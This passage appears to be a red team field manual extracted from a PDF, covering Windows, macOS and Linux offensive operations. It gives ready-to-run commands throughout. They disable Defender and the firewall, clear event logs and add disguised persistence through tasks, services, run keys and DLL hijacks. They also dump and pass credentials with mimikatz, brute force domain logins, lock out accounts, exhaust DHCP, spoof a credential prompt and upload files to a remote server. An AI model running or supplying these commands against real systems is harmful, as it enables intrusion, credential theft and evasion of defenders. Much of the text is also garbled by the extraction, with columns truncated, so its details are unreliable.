onal Unit (OU):    This type of object is a “container” that can include other
                  objects. This can be useful if a company wants to further
                  containerize objects such as putting all accounting users
                  and computers into an OU called “accounting”.
 Active Directory Exploitation Checklist
Windows hashes are NOT salted. Password re-use is very common
for users that have multiple user accounts in different domains.
Domain Service account passwords may not be changed often.
Certain “Enterprise Admin” accounts may be used to traverse
forest domains.
Domains should utilize separation of privilege. Workstation
Admins administer workstations, SQL Admins administer SQL
Servers, etc.
  D                         U            E
This section details important and useful domain enumeration commands.
       These commands can display computers, users, groups, etc.

 DOMAIN ENUMERATION WITH NET.EXE
  Net.exe will NOT list groups in groups. Refer to DSQuery section to
                     enumerate groups in groups.
                                               List accounts with
 net localgroup administrators           administrative access to the
                                                current machine
                                        List accounts and groups with
 net localgroup administrators
                                         administrative access to the
 /domain
                                               domain controller
                                       Display hosts currently visible
 net view /domain
                                                 on the network
                                          Display all users in current
 net user /domain
                                                     domain
                                         Display user information for
 net user <USERNAME> /domain             domain user account (status,
                                              policy, groups, etc.)
                                           Display domain account
 net accounts /domain
                                                     policies
 net group /domain                         Display domain groups
 net group "<GROUPNAME>"                  Display users in a domain
 /domain                                              group
 net group "Domain Controllers"         Display domain controllers in
 /domain                                      the current domain
 net group "Domain Computers"                Display all computer
 /domain                                hostnames for current domain
 net user <USERNAME>
                                        Unlock domain user account
 /ACTIVE:YES /domain
 net user <USERNAME> "                 Change domain user password
<PASSWORD>" /domain
 DOMAIN ENUMERATION WITH
         DSQUERY
  All DSQuery commands must be run from a machine
    that has dsquery.exe on disk (commonly Windows
   Server) and most of the commands DO NOT require
                 administrative privileges.
dsquery * -filter "(&                          Display
(objectclass=user)(admincount=1))" -        administrative
attr samaccountname name                         users
dsquery * -filter "
((objectclass=user))" -attr name           Output dsquery
samaccountname >                            results to disk
<OUTPUT_PATH>
makecab <INPUT_PATH>                          Compress
<OUTPUT_PATH>                              dsquery results
expand <INPUT_PATH>                        Extract dsquery
<OUTPUT_PATH>                                   results
dsquery * -filter "
(objectclass=organizationalUnit)" -        Display Active
attr name distinguishedName                Directory OUs
description -limit 0
dsquery * -filter "                            Display
(operatingsystem=*10*)" -attr name            computers
operatingsystem dnshostname -limit           filtering on
0                                        operating system
                                              Display all
dsquery * -filter "(name=*DC*)" -attr computers with a
name operatingsystem dnshostname -          pattern in the
limit 0                                       hostname
                                               (*DC*)
dsquery * -filter "(name=*smith*)" -          Display all
attr name samaccountname                 Active Directory
description -limit 0                        objects with a
                                           pattern SMITH
                                          in the hostname.
Great for finding
 user objects!
   DOMAIN ENUMERATION WITH
        DSQUERY CONT
                                           Filter on EPOCH
                                          time (password last
                                          changed, last login,
dsquery * -filter "(&                             etc.)
(objectclass=user)(lastlogon>
<EPOCH_TIME>))" -attr                    1 with 12 0's is a day
samaccountname name                            in epoch
                                          (1000000000000).
                                          Add or subtract to
                                         adjust dsquery filter
dsquery * -filter "                          Display trusts
(objectclass=trusteddomain)" -attr          associated with
flatname trustdirection                     current domain
dsquery * -filter "
                                             Display active
(operatingsystem=*server*)" -attr
                                         directory objects in a
name operatingsystem description
                                            remote domain
dnshostname -d
                                         (useful if trust exists)
<DOMAIN_FQDN>
dsquery * -filter "
(objectclass=computer)" -attr name        Display computers
dnshostname operatingsystem              with helpful attributes
description -limit 0
dsquery * -filter "(objectclass=user)"
-attr name samaccountname                 Display users with
lastlogon memberof description -          helpful attributes
limit 0
dsquery * -filter "
(objectclass=group)" -attr name          Display groups with
samaccountname member                     helpful attributes
description -limit 0
dsquery * -filter "(name=*admin*)" -     Display every Active
attr name samaccountname                 Directory object with
description objectclass -limit 0          admin in the name
w32tm /ntte <EPOCH_TIME>     Convert NT epoch
                                    time
                           (lastLogonTimestamp
                               time format) to
                                  readable
  FINDING USER SYSTEM IN A WINDOWS DOMAIN
                                                                   Query EventLogs for
                                                                    user logins looking
                                                                    for system that was
                                                                        logged into.

                                                                    May need to be run
                                                                      from all DCs in
wevtutil qe security /rd:true /f:text /q:"*[System/EventID=4624]     domain to locate
and *                                                                proper event log.
[EventData/Data[@Name='TargetUserName']='<USERNAME>']"
/c:20                                                                Is case sensitive.

                                                                   Can be run remotely
                                                                   with credentials with
                                                                      the following
                                                                        argument:

                                                                   /r:<IP_ADDRESS>>
                                                                      Utilize dsquery to
                                                                    search for user's last
                                                                    name in description
                                                                      (searches all AD
                                                                           objects).
dsquery * -filter "(description=*<USER_LAST_NAME>*)" -attr
                                                                      Occasionally user
name samaccountname description
                                                                         workstation
                                                                   information could be
                                                                       stored in Active
                                                                    Directory objects or
                                                                          description
                                                                       Connect to any
                                                                     server (likely a file
                                                                      server) that could
net session
                                                                       have active user
                                                                      home directories
                                                                           mapped
           W                     [R ]C
This section covers re-configuration of Windows which can be used to further a potential
 red team assessment. A few examples include enabling remote desktop protocol, adding
                           firewall rules, or creating accounts.

            REMOTE DESKTOP PROTOCOL (RDP)
                   CONFIGURATION
reg add
"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f

reg add
"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
                                                                                Enable
reg add                                                                          RDP
"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

netsh advfirewall firewall set rule group="remote desktop" new enable=yes

sc start TermService
                                                                               Optional:
                                                                                   Can
                                                                                 execute
reg add “\\                                                                    technique
<IP_ADDRESS>\HKLM\SYSTEM\CurrentControlSet\Control\Terminal                     remotely
Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f                   by
                                                                              interacting
                                                                                   with
                                                                                 remote
                                                                                 registry
reg add "HKLM\System\CurrentControlSet\Control\Terminal                          Change
Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f                   RDP
                                                                               Listening
                                                                                   Port
                                                                                Number
                                                                                (Need to
                                                                                  restart
 RDP
Service)
                             MISC [RE]CONFIGURATION
                                                                                   Lock
rundll32 user32.dll,LockWorkStation                                              workstation

netsh advfirewall set currentprofile state off                                     Disable
                                                                                  Windows
netsh advfirewall set allprofiles state off                                       firewall
netsh interface portproxy add v4tov4 listenport=3000 listenaddress=1.1.1.1         Native
connectport=4000 connectaddress=2.2.2.2                                         Windows port
                                                                                 forward (*
#Remove                                                                           must be
netsh interface portproxy delete v4tov4 listenport=3000 listenaddress=1.1.1.1      admin)
                                                                                 Re-enable
reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t
                                                                                 command
REG_DWORD /d 0 /f
                                                                                   prompt
                                                                                List software
wmic product get name /value                                                     names and
wmic product where name="XXX" call uninstall /nointeractive                       uninstall
                                                                                  software
reg add
                                                                                 Turn on IP
"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
                                                                                 forwarding
/v IPEnableRouter /t REG_DWORD /d 1 /f
                                                                                Share a folder
net share sharename=<SHARE_FOLDER> /GRANT:everyone,FULL
                                                                                   with full
                                                                                 permissions
icacls <FILE_PATH> /grant Everyone:(F) /T
                                                                                 to everyone
                                                                                 Add a local
net user <USERNAME> <PASSWORD> /ADD                                             user and place
                                                                                 in the local
net localgroup "Administrators" <USERNAME> /ADD                                 administrators
                                                                                    group
                                                                                  Uninstall a
wusa /uninstall /kb:4516059 /quiet
                                                                                     patch
                                                                                   Forcibly
                                                                                delete all files
                                                                                     from
del <FILE_PATH>\*.* /S /Q /F                                                       specified
                                                                                directory and
                                                                                      all
                                                                                subdirectories
         DISABLE WINDOWS DEFENDER
sc config WinDefend start= disabled       Disable service
sc stop WinDefend                           Stop service
                                       PowerShell command to
Set-MpPreference -DisableRealtimeMon
                                          disable real time
itoring $true
                                             monitoring
"%ProgramFiles%\Windows Defe
                                       PowerShell command to
nder\MpCmdRun.exe" -RemoveDefi
                                       remove virus definitions
nitions -All
              WINDOWS EVENT VIEWER
                  MANIPULATION
                                                          Backup the
wevtutil cl Application /bu:<FILE_PATH>.evtx         Application log and
                                                     then clear all events
                                                     Display the 20 most
wevtutil qe Application /c:20 /rd:true /f:text     recent events from the
                                                        application log
wevtutil qe security /q:”*                           Display the last 100
[System[(EventID=4624)]]” /c:100 /rd:true                logon events
date = (Get-Date).AddHours(-24); Get-                  Display all logon
WinEvent –FilterHashTable @{ logname =              events during the last
”Security”; STARTTIME = $date; ID = 4624}          24 hours (PowerShell)
Get-EventLog –list
                                                    Clear Security &
                                                   Application event log
Clear-EventLog -LogName Application,                  (PowerShell)
Security
Prefetch Location:
%SYSTEMROOT%\Prefetch

Prefetch filename structure:
<APPLICATION_NAME>-<8 CHAR HASH
OF LOCATION>
                                                          Prefetch [11]
Additional meta data:
-executable name (up to 29 chars)
-number of times the application has been
executed
-volume related information
-files and directories used during application
start-up
More info at: https://forensicswiki.xyz/wiki/index.php?
title=Windows_Prefetch_File_Format
          U            L             P
This section details important and useful user level persistence techniques.
    Since they are “user level” they do not require any administrative
            privileges and most of them execute on user log in.

   SCHEDULED TASK USER PERSISTENCE
 Upload binary and add scheduled task pointing at that uploaded binary.
 Can change OfficeUpdater to a task name that blends into target system.
schtasks /Create /F /SC DAILY /ST 09:00 /TN         Add user level task
OfficeUpdater /TR <FILE_PATH>                        that executes at
                                                      9:00AM daily
schtasks /query /tn OfficeUpdater /fo list /v     Query task in verbose
                                                          mode
schtasks /delete /tn OfficeUpdater /f                   Delete task


           RUN KEY USER PERSISTENCE
  Upload binary and add run key value pointing at uploaded binary. Can
   change OfficeUpdater to run key value that blends into target system.
reg ADD
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run Add key
/V OfficeUpdater /t REG_SZ /F /D “<FILE_PATH>”
reg query                                                          Query
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run                  key
reg delete
                                                                  Delete
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
                                                                    key
/V OfficeUpdater
                              STARTUP DIRECTORIES
 Upload binary to a specific “startup” folder. All files in this folder are executed on user login.
                                                                                           Windows
All users:
                                                                                            NT 6.1,
%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
                                                                                               6.0,
                                                                                           Windows
Specific users:
                                                                                               10,
%SystemDrive%\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Start
                                                                                           Windows
Menu\Programs\Startup
                                                                                                11
                                                                                           Windows
%SystemDrive%\Documents and Settings\All Users\Start Menu\Programs\Startup                  NT 5.2,
                                                                                            5.1, 5.0
                                                                                           Windows
%SystemDrive%\wmiOWS\Start Menu\Programs\Startup
                                                                                                9x
                                                                                           Windows
                                                                                            NT 4.0,
%SystemDrive%\WINNT\Profiles\All Users\Start Menu\Programs\Startup
                                                                                              3.51,
                                                                                              3.50


                          AT.EXE SCHEDULE (WINXP)
at HH:MM <FILE_PATH> [ARGS]                                                       Schedule task
at <TASK_ID> /delete                                                               Delete task


                      POISONING EXISTING SCRIPTS
 Enumerate all user persistence methods discussed in this section looking for existing persistence
that has been created via script files such as .bat, .ps1, etc. If those are modifiable by a basic user,
 modify them to launch a malicious uploaded payload. Just beware, if the script is on a file server
                                it could be executed by many users.
        S                L             P
    This section details important and useful SYSTEM level persistence
  techniques. Since they are “SYSTEM” they will require administrative
        privileges and most of them execute during system startup.
                   SCHTASKS ON BOOT
 Upload binary to system folder and create scheduled task pointing at that
 binary for execution. Can change OfficeUpdater to a different task name
                       that blends into target system.
schtasks /Create /F /RU system /SC ONLOGON
                                                            Add task
/TN OfficeUpdater /TR <FILE_PATH>
                                                          Query task in
schtasks /query /tn OfficeUpdater /fo list /v
                                                         verbose mode
schtasks /delete /tn OfficeUpdater /f                      Delete task
schtasks /run /tn OfficeUpdater                        Run Task Manually
                                                       Optional: Can call
schtasks /create /tn OfficeUpdater /xml
                                                       schtasks to import
<FILE_PATH>.xml /f
                                                         a task as XML

                   SERVICE CREATION
  Upload binary to folder and create service pointing at that binary. Can
 change the service description and display name to blend into the target
                                 system.
                                                   Add service (Change
sc create <SERVICE_NAME> binpath= "
                                                  displayname to a name
<FILE_PATH>" start= auto displayname=
                                                 that blends in with your
"Windows Update Proxy Service"
                                                        executable)
                                                   Assign description to
sc description <SERVICE_NAME> "This                  service (Change
service ensures Windows Update works           description to a phrase that
correctly in proxy environments"               blends in with your service
                                                       information)
sc qc <SERVICE_NAME>                               Query Service config
sc query <SERVICE_NAME>                            Query service status
sc qdescription <SERVICE_NAME>    Query service description
sc delete <SERVICE_NAME>                Delete service
                                  OPTIONAL: Can execute
sc \\<IP_ADDRESS> qc             sc.exe commands remotely
<SERVICE_NAME>                    by referencing the remote
                                     system after sc.exe
              WINDOWS 10 .DLL HIJACK
                (WPTSEXTENSIONS)
   Upload malicous.dll named WptsExtensions.dll (works with default
   Cobalt Strike .dll) anywhere in system path, reboot machine, and the
       schedule service will load the malicious WptsExtensions.dll
reg query
                                                              List folders
"HKLM\SYSTEM\CurrentControlSet\Control\Session
                                                                in PATH
Manager\Environment" /v PATH
   Upload malicous.dll named "WptsExtensions.dll" to folder in PATH
  Reboot target computer (Schedule service will load WptsExtensions.dll
                                on startup)
      Remove uploaded WptsExtensions.dll to remove persistence
Note: Many .dll hijacks exist on Windows systems and a simple Google
search should list all the vulnerable filenames, services, and even contain
examples of how to execute a given .dll hijack technique on a system.
               W                     S
This section details various PowerShell and Batch script examples. Some of
 these examples enumerate system information, cause system effects, or aid
                 with the discovery of sensitive information.

                   P  S    S
                  POWERSHELL BASICS
Stop-Transcript                               Stops recording
Get-Content <FILE_PATH>                    Displays file contents
                                            Shows examples of
Get-Help <COMMAND> -Examples
                                                <command>
                                          Searches for command
Get-Command *<STRING_TO_SEARCH>*
                                                    string
                                          Displays services (stop-
Get-Service
                                           service, start-service)
                                           Displays services, but
Get-WmiObject -Class win32_service                  takes
                                            alternate credentials
                                            Display PowerShell
$psVersionTable
                                                   version
                                            Run PowerShell 2.0
powershell -version 2.0
                                                  from 3.0
Get-Service | measure-object               Returns # of services
                                           Displays drives in the
get-psdrive
                                               current session
                                           Returns only process
Get-Process | select -expandproperty name
                                                   names
get-help * -parameter credential          Cmdlets that take creds
                                          Available WMI network
get-wmiobject -list *network
                                                 commands
[Net.DNS]::GetHostEntry("<IP_ADDRESS>")         DNS Lookup
                                   POWERSHELL ONELINERS
                                                                                                      La
powershell -ep bypass -nop -File <FILE_PATH>
                                                                                                      Po
                                                                                                       T
                                                                                                      co
                                                                                                       (s
$ports=(<PORT>,<PORT>,<PORT>);$ip="<IP_ADDRESS>";foreach ($port in $ports){try{$socket=New-
                                                                                                       (C
object System.Net.Sockets.TCPClient($ip,$port);}catch{};if ($socket –eq $NULL){echo $ip":"$port" –
                                                                                                     <PO
Closed";}else{echo $ip":"$port" – Open";$socket = $NULL;}}
                                                                                                     mat
                                                                                                     port
                                                                                                      and

                                                                                                     Ping
$ping = New-Object System.Net.Networkinformation.ping;$ping.Send("<IP_ADDRESS>",500)                  mi
                                                                                                        t
powershell –WindowStyle Hidden –ExecutionPolicy Bypass $Host.UI.PromptForCredential("
                                                                                                     auth
<WINDOW_TITLE>","<MESSAGE>","<USERNAME>","<DOMAIN>")
                                                                                                       Ru
                                                                                                     ever
                                                                                                     betw
powershell –Command "do {if ((Get-Date –format YYYYMMDD-HHMM) –match ‘202208(0[8-9]|1[0-1])-
                                                                                                      8-
(0[8-9]|1[0-7])[0-5][0-9]’){Start-Process –WindowStyle Hidden "<FILE_PATH>";Start-Sleep –s
                                                                                                     and
14400}}while(1)"
                                                                                                     of 0

                                                                                                       C


$password = convertto-securestring –string "<PASSWORD>" –asplaintext –force;
$pp = new-object –typename System.Management.Automation.PSCredential –argumentlist "<DOMAIN>\
                                                                                                      Po
<USERNAME>", $pw;
Start-Process powershell –Credential $pp –ArgumentList ‘-noprofile –command &{Start-Process
<FILE_PATH> -verb runas}’
                                POWERSHELL ONELINERS CONT
Send-MailMessage –to "<EMAIL>" –from "<EMAIL>" –subject "<SUBJECT>" –a "
                                                                                                            E
<FILE_ATTACHEMENT>" –body "<BODY>" –SmtpServer "<IP_ADDRESS>" -Port "<PORT>" -
                                                                                                            se
Credential "<PS_CRED_OBJECT>" -UseSsl
                                                                                                          Pow
                                                                                                              f
powershell –noprofile –noninteractive –Command 'Invoke-WebRequest -Uri "https://<URL>" -OutFile            dow
<FILE_PATH>'                                                                                                 fr
                                                                                                           spe
                                                                                                             U
Script will send a file ($filepath) via http to server ($server) via POST request. Must have web server
listening on port designated in the $server
                                                                                                          Pow
powershell –noprofile –noninteractive –command
                                                                                                           data
‘[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
$server="""http://<URL>"""; $filepath="""<FILE_PATH> """; $http = new-object System.Net.WebClient;
$response = $http.UploadFile($server,$filepath);’
                                                                                                      Exp
Get-WmiObject -class win32_operatingsystem | select -property * | export-csv <FILE_PATH>               inf
                                                                                                       CS
                                                                                                           L
Get-Service | where {$_.status -eq "Running"}                                                           run
                                                                                                        ser
                                                                                                      Pow
[System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().GetActiveTcpConnections()   Ne
                                                                                                      Equ
                                                                                                       Per
                                                                                                      PSD
New-PSDrive -Persist -PSProvider FileSystem -Root \\<IP_ADDRESS>\<SHARE_FOLDER> -Name i
                                                                                                      remo
                                                                                                          sh
                                                                                                         Re
Get-ChildItem -Path <FILE_PATH> -Force -Recurse -Filter *.log -ErrorAction SilentlyContinue | where    file
{$_.LastWriteTime -gt "2012-08-20"}                                                                    writ
                                                                                                       pas
                                                                                                        Tu
Powershell -Command 'Enable-PSRemoting -Force’                                                        Pow
                                                                                                       rem
                 W               B         S

                       BATCH SCRIPTS
  If executing script from a batch file, variables must be preceded with %
                            (for a total of 2 %’s).
for /L %i in (10,1,254) do @ (for /L %x in
(10,1,254) do @ ping -n 1 -w 100 10.10.%i.%x           Nested for loop ping
2>nul | find "Reply" && echo 10.10.%i.%x >>                   sweep
live.txt)
for /F "tokens=*" %%A in (<FILE_PATH>) do               Loop through each
echo %%A                                                   line in a file
for /F %%N in (users.txt) do for /F %%P in
(passwords.txt) do net use \\
<IP_ADDRESS>\IPC$ /user:<DOMAIN>
                                                       Domain brute forcer
\%%N %%P 1>NUL 2>&1 && echo
%%N:%%P && net use /delete \\
<IP_ADDRESS>\IPC$ > NUL
@echo Test run:
                                                       Account lockout
for /F "tokens=*" %%A in (<FILE_PATH>) do               (lockout.bat)
net use \\<IP_ADDRESS>\c$ /USER:
<DOMAIN>\%%A wrongpass
for /L %%P in (2,1,254) do (netsh interface ip
set address name= "<INTERFACE_NAME>"
static 10.0.42.%%P 255.255.255.0                       DHCP exhaustion
<GATEWAY_IP> && ping 127.0.0.1 –n 1 –w
10000 > nul %1)
for /L %%P in (2,1,254) do (nslookup
10.1.11.%%P | findstr /i /c:"Name" >> dns.txt        DNS reverse lookup
&& echo HOST: 10.1.11.% %%P >> dns.txt)
                 BATCH SCRIPTS CONT
                                                     Search for files
                                                   beginning with the
                                                    word "pass" and
                                                    then print if it's a
forfiles /P <FILE_PATH> /s /m pass* -c "cmd /c
                                                      directory, file
echo @isdir @fdate @ftime @relpath @path
                                                   date/time, relative
@fsize"
                                                    path, actual path
                                                         and size
                                                     (@variables are
                                                        optional)
Domains.txt should contain known malicious
domains. If you do not want to make a legitimate
                                                     Simulate DNS
DNS request for a malicious domain then just
                                                      lookups for
provide your local IP in place of
                                                   malicious domains
<DNS_SERVER_IP>.
                                                   (useful for testing
                                                      detection of
for /F "tokens=*" %%A in
                                                       AV/IDS)
(C:\Users\Administrator\Desktop\domains.txt) do
nslookup %%A <DNS_SERVER_IP>
                                                      Simulated web
for /L %%P in (2,1,401) do @for %%U in
                                                    browsing (simple
(<URL1> <URL2> <URL3>) do start /b iexplore
                                                   traffic generation).
%%U & ping -n 6 localhost & taskkill /F /IM
                                                    Browse to URL’s
iexplore.exe
                                                        400 times.
                                                      Rolling reboot
for /L %%P in (2,1,254) do shutdown /r /m
                                                    (replace /r with /s
\\1.1.1.%%P /f /t 0 /c "Reboot message"
                                                     for a shutdown)
                P            E
This section details various post exploitation tools and techniques such as
mimikatz, PsExec, privilege escalation tactics, file system redirection, etc.

MIMIKATZ CREDENTIAL MANIPULATION
                                                     Mimikatz PTH (Runs
mimikatz.exe "sekurlsa::pth /user:
                                                     specified binary with
<USERNAME> /domain:<DOMAIN> /ntlm:
                                                    PTH credentials). Must
<NTLM_HASH> /run:<FILE_PATH>" exit
                                                      be run as SYSTEM
                                                     Mimikatz hashdump.
mimikatz.exe "lsadump::sam" exit                        Must be run as
                                                           SYSTEM
mimikatz.exe sekurlsa::pth /user:                   PTH with AES128/256
<USERNAME> /domain: <DOMAIN> /ntlm:                 bit keys. AES128/256
<NTLM_HASH> /aes128:<aes128_HASH>                       bit keys can be
/aes256:<aes256_HASH>                                obtained via DCSync
wmic group where name="Domain Admins" get
name,sid,domain

or

reg query HKU to retrieve logged in domain
                                                      Extract domain SID
user SIDs (which contain domain SID)
                                                     from Active Directory
                                                             object
Result of above commands:
S-1-5-21-520640528-869697576-4233872597-
1532

The Domain SID Portion is:
S-1-5-21-520640528-869697576-4233872597
mimikatz.exe “lsadump::dcsync /domain:              Remote dump hash for
<DOMAIN_FQDN> /user: <USERNAME>”                     specific user account
                                                    (Administrators,
                                                  Domain Admins, or
                                                 Enterprise Admins are
                                                    able to remotely
                                                       DCSync)
                                                  Get the SysKey to
                                                   decypt SECRETS
mimikatz.exe “lsadump::secrets”
                                                 entries (from registry
                                                        or hives)
More info at: https://book.hacktricks.xyz/windows-hardening/stealing-
credentials/credentials-mimikatz
      WINDOWS PRIVILEGE ESCALATION
               CHECKLIST
            Enumerate all File Servers in a domain and net view to find
            open shares. Once all shares are located, enumerate all share
            files/folders for sensitive data such as: administrative info,
            credentials, user home directories, etc. Repeat against other
            systems in the domain (other server roles like database, web,
            etc.) which may have misconfigured network shares exposing
            sensitive data.

            Enumerate PATH and then .DLL hijack (wlbsctrl or
            scheduler) if applicable.

            Run open-source tool "SharpUp" to enumerate potential
            privilege escalation opportunities such as vulnerable paths,
            weak service information, and more.

            Enumerate startup folder, user scheduled tasks, etc. Attempt
            to poison global shared scripts set to run at login.

            Gain access to administrative shares and attempt to poison
            scripts run by administrators or macro enabled files.
More info at: https://github.com/GhostPack/SharpUp


            FILE SYSTEM REDIRECTION
          File System Redirection - > Jump to x64 process from x86
          Execute x64 binary: C:\Windows\Sysnative\upnpcont.exe
tasklist /v | findstr Use tasklist to list processes and find the PID of the
upnpcont                              process that was launched
                  Inject into PID discovered in previous step
                            Exit original x86 process
M   OS
                  M          OS D
 This section details Mac OS version information and general file system
layout. There are many similarities between Mac OS and Linux, but there
                are also many key differences listed below.

                    M OS V
    ID             VERSION                DATE RELEASED
10.0.4          Mac OS X Cheetah                   2001-03-24
10.1.5           Mac OS X Puma                     2001-09-25
10.2.8           Mac OS X Jaguar                   2002-08-23
10.3.9          Mac OS X Panther                   2003-10-24
10.4.11          Mac OS X Tiger                    2005-04-29
10.5.8          Mac OS X Leopard                   2007-10-26
10.6.8        Mac OS X Snow Leopard                2009-08-28
10.7.5              OS X Lion                      2011-07-20
10.8.5         OS X Mountain Lion                  2012-07-25
10.9.5           OS X Mavericks                    2013-10-22
10.10.5           OS X Yosemite                    2014-10-16
10.11.6          OS X El Capitan                   2015-09-30
10.12.6            macOS Sierra                    2016-09-20
10.13.6         macOS High Sierra                  2017-09-25
10.14.6           macOS Mojave                     2018-09-24
10.15.7           macOS Catalina                   2019-10-07
11.6.7            macOS Big Sur                    2020-11-12
12.4             macOS Monterey                    2021-10-25
   FILE SYSTEM STRUCTURE
                Contains applications such as Mail,
/Applications
                Calendar, Safari, and many others
/bin                       User binaries
/dev               Interface for system devices
                Hidden binary files which contain
/cores          pieces of computer memory. Used
                      for debugging purposes
/etc                System configuration files
/Users             Base directory for user files
/Library            Critical software libraries
/home                  Not used for anything
                 Stores essential system files and
/private
                               caches
/opt                   Third party software
/sbin             System administrator binaries
/System          Contains operating system files
/tmp                      Temporary files
/usr                     Less critical files
/Volumes             Shows mounted volumes
/var                   Variable system files
       M        OS S                  E
  This section details system enumeration and user/group manipulation
commands. It is worth noting user management and authentication in Mac
OS is accomplished much differently than Linux. Shadow/Passwd files are
         not used and user information is stored in “.plist” files.
        MAC OS SITUATIONAL AWARENESS
ls /Applications                                 Display apps
hostname                                   Display computer name
id                                            Current username
w                                            List logged on users
                                           List previous user log in
last
                                                    sessions
df -h                                             Disk usage
                                            Kernel version & CPU
uname -a
                                                 information
mount                                        List mounted drives
                                             Display OS version
sw_vers
                                                 information
echo $0                                       Display shell type
                                            Enumerate user home
ls /Users
                                                   directories
ifconfig -a                               Network and IP information
ps -ef                                       Process enumeration
kill -9 <PID>                                  Kill process PID
ps -ef | grep -ia
                                              Find specific process
<STRING_TO_SEARCH>
                                         Check for active TCP network
netstat -p tcp -van
                                                 connections
                                          Add another variable to the
sudo nano /etc/paths
                                                    PATH
        USER PLIST FILE ENUMERATION
  As mentioned above, Mac OS stores user information (including user
password hashes) in files called property lists (.plist). With administrative
   credentials, these can be directly enumerated, and user hashes can be
                                  collected.
                                                                 Enumerate
sudo plutil -p                                                    user plist
/var/db/dslocal/nodes/Default/users/<USERNAME>.plist information
                                                                 Enumerate
sudo dscl . read Users/<USERNAME>                              user password
ShadowHashData                                                      hash
         USER ENUMERATION &
            MODIFICATION
                                    Display all user and
dscl . list /Users
                                      daemon accounts
                                     Display actual user
dscl . list /Users | grep -v '_'   accounts (No daemon
                                          accounts)
                                   Display verbose user
                                     information (shell
dscacheutil -q user                  type, gid, uid, full
                                     name, description,
                                             etc.)
                                   Display very verbose
dscl . -read
                                      user information
/Users/<USERNAME>
                                    (user hash included)
                                   Enumerate a specific
dscacheutil -q group -a name
                                        user's group
<GROUP_NAME>
                                        assignments
dscl . -delete
                                        Delete user
/Users/<USERNAME>


          CREATE USER MAKE
            ADMINISTRATOR
                                          Create User
  dscl . -create /Users/<USERNAME>
                                           Set shell
  dscl . -create /Users/<USERNAME>
                                          preferences
  UserShell /bin/bash
                                            for user
  dscl . -create /Users/<USERNAME>
                                          Set user full
  RealName "
                                             name
  <USER_FULL_NAME>"
  dscl . list /Users UniqueID            List out ID’s
                                          and select
                                   an un-used
                                       ID
dscl . -create /Users/<USERNAME>
                                   Set unique
UniqueID "
                                   ID for user
<NEWLY_SELECTED_ID>"
                                   Give list of
dscl . -create /Users/<USERNAME>    users that
PrimaryGroupID 20                  belong to a
                                     group.
dscl . -create /Users/<USERNAME>
NFSHomeDirectory
/Users/<USERNAME>                  Make home
                                    directory
mkdir /Users/<USERNAME>
dscl . -passwd
                                     Set user
/Users/<USERNAME>
                                    password
<NEW_PASSWORD>
                                   Add user to
dscl . -append /Groups/admin
                                     admin
GroupMembership <USERNAME>
                                     group
                       CREATE A GROUP
sudo dscl . -create
                                                       Create group
/Groups/<GROUPNAME>
sudo dscl . -create
/Groups/<GROUPNAME> RealName                        Add longform name
"Service and Support"
sudo dscl . -create
                                                 Initialize group password
/Groups/<GROUPNAME> passwd "*"
dscl . list /Groups PrimaryGroupID | tr -s ' '
                                                   Find unused group ID
| sort -n -t ' ' -k2,2
sudo dscl . -create
/Groups/<GROUPNAME> gid                              Assign group ID
<NEWLY_SELECTED_ID>
sudo dscl . -create                               Assign only ONE user to
/Groups/<GROUPNAME>                              group (will overwrite with
GroupMembership <USERNAME>                            this ONE user)


GROUP ENUMERATION & MODIFICATION
                                                  Enumerate all groups and
dscacheutil -q group
                                                      their members
sudo dscl . -append                                Append user to group
/Groups/<GROUPNAME>
GroupMembership <USERNAME>
sudo dscl . -delete                               Remove user from group
/Groups/<GROUPNAME>
GroupMembership <USERNAME >
dscl . -delete /Groups/<GROUPNAME>                      Delete group
*N
        L            OS D
       FILE SYSTEM STRUCTURE
/              Anchor and root of the filesystem
/bin                       User binaries
/boot                 Boot-up related files
/dev              Interface for system devices
/etc               System configuration files
/home             Base directory for user files
/lib               Critical software libraries
/opt                  Third party software
/proc            System and running programs
/root             Home directory of root user
/sbin            System administrator binaries
/tmp                     Temporary files
            Contains all the system files. Less critical
/usr
                               files
/var                  Variable system files
      IMPORTANT FILE/DIRECTORY
            DESCRIPTIONS
                              User account information and
/etc/shadow
                                     password hashes
/etc/passwd                     User account information
/etc/group                            Group names
/etc/rc.d                     Startup services (rc0.d-rc6.d)
/etc/init.d                   Contains startup/stop scripts
                              Hardcoded hostname and IP
/etc/hosts
                                      combinations
/etc/hostname                  Full hostname with domain
/etc/network/interfaces
or                               Network configuration
/etc/netplan
/etc/profile                  System environment variables
/etc/apt/sources.list            Debian package source
/etc/resolv.conf                   DNS configuration
/home/<USER>/.bash_history          User Bash history
                               Vendor-MAC lookup (Kali
/usr/share/wireshark/manuf
                                         Linux)
~/.ssh/                               SSH keystore
/var/log                      System log files (most Linux)
/var/adm                         System log files (Unix)
/var/spool/cron                      List cron files
/var/log/apache2/access.log      Apache connection log
                               Contains local and network
/etc/fstab
                              configured mounts and shares
               /ETC/SHADOW FILE FORMAT
    1              2       3 4 5 6 7 8 9
 root:     $6$RqNi$...PbED0:          16520: 0: 99999: 7: :         :
1       Login name
2       Encrypted password
3       Date of last password change (days since epoch)
4       Minimum password age (in days)
5       Maximum password age (in days)
6       Password warning period (in days)
7       Password inactivity period (in days)
8       Account expiration date (days since epoch)
9       Reserved


                /ETC/SHADOW HASH TYPES
kryptonite:$6$n4wLdmr59pt.......:18912:0:99999:7:::
            First three characters of the hash list the hash type
$1$                                     MD5
$2a$                                    bcrypt
